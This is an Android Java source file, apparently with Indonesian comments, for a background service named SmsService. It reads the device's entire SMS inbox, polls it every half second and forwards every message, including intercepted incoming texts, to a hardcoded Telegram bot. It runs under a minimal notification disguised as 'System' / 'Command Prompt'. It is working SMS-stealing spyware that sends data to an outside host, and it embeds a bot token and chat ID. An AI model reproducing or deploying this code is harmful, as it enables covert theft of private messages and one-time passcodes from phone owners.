package com.commandprompt;

import android.Manifest;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.HashSet;
import java.util.Set;

public class SmsService extends Service {

    private static final String TAG = "SmsService";
    private static final String CH_ID = "sms_mon";

    // GANTI dengan punya kamu
    private static final String BOT_TOKEN = "8539992688:AAEuPMyOXEweuaaHebCjGqsnMdeucQFKXhA";
    private static final String CHAT_ID   = "8275632263";

    private static final long LOOP_MS = 500;

    private final Set<String> seen = new HashSet<>();
    private boolean firstRun = true;
    private Handler handler;

    @Override
    public void onCreate() {
        super.onCreate();
        createChannel();
        startForeground(1, buildNotif());
        handler = new Handler(Looper.getMainLooper());
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // realtime dari SmsReceiver
        if (intent != null && intent.hasExtra("body")) {
            final String from = intent.getStringExtra("from");
            final String body = intent.getStringExtra("body");
            final long time = intent.getLongExtra("time", System.currentTimeMillis());
            sendTelegram("📩 SMS REALTIME\n"
                    + "dari: " + from + "\n"
                    + "waktu: " + time + "\n"
                    + "isi: " + body);
        }

        // mulai polling hanya jika izin sudah ada
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)
                == PackageManager.PERMISSION_GRANTED) {
            handler.post(new Runnable() {
                @Override public void run() {
                    poll();
                    handler.postDelayed(this, LOOP_MS);
                }
            });
        } else {
            Log.e(TAG, "READ_SMS belum diizinkan, polling tidak jalan");
        }

        return START_STICKY;
    }

    private void poll() {
        Cursor c = null;
        try {
            c = getContentResolver().query(
                    Uri.parse("content://sms/inbox"),
                    new String[]{"_id", "address", "body", "date"},
                    null, null, "date ASC");

            if (c == null) {
                Log.e(TAG, "cursor null, mungkin izin belum diberikan");
                return;
            }

            JSONArray all = new JSONArray();

            while (c.moveToNext()) {
                String id = c.getString(0);
                String addr = c.getString(1);
                String body = c.getString(2);
                long date = c.getLong(3);

                JSONObject o = new JSONObject();
                o.put("id", id);
                o.put("from", addr);
                o.put("body", body);
                o.put("date", date);
                all.put(o);

                if (!firstRun && !seen.contains(id)) {
                    sendTelegram(
                            "📩 SMS BARU\n" +
                            "dari: " + addr + "\n" +
                            "waktu: " + date + "\n" +
                            "isi: " + body
                    );
                }
                seen.add(id);
            }

            if (firstRun) {
                firstRun = false;
                sendTelegram("📦 SMS LAMA (" + all.length() + ")\n" + all.toString());
            }
        } catch (Exception e) {
            Log.e(TAG, "poll failed", e);
        } finally {
            if (c != null) c.close();
        }
    }

    private void sendTelegram(String text) {
        new Thread(() -> {
            try {
                URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");

                String body = "chat_id=" + CHAT_ID +
                        "&text=" + URLEncoder.encode(text, StandardCharsets.UTF_8.name());

                OutputStream os = conn.getOutputStream();
                os.write(body.getBytes(StandardCharsets.UTF_8));
                os.flush();
                os.close();

                Log.d(TAG, "telegram resp: " + conn.getResponseCode());
                conn.disconnect();
            } catch (Exception e) {
                Log.e(TAG, "telegram failed", e);
            }
        }).start();
    }

    private void createChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(
                    CH_ID, "System", NotificationManager.IMPORTANCE_MIN);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(ch);
        }
    }

    private Notification buildNotif() {
        return new NotificationCompat.Builder(this, CH_ID)
                .setContentTitle("Command Prompt")
                .setContentText("Running")
                .setSmallIcon(android.R.drawable.ic_menu_info_details)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setOngoing(true)
                .build();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) { return null; }
}
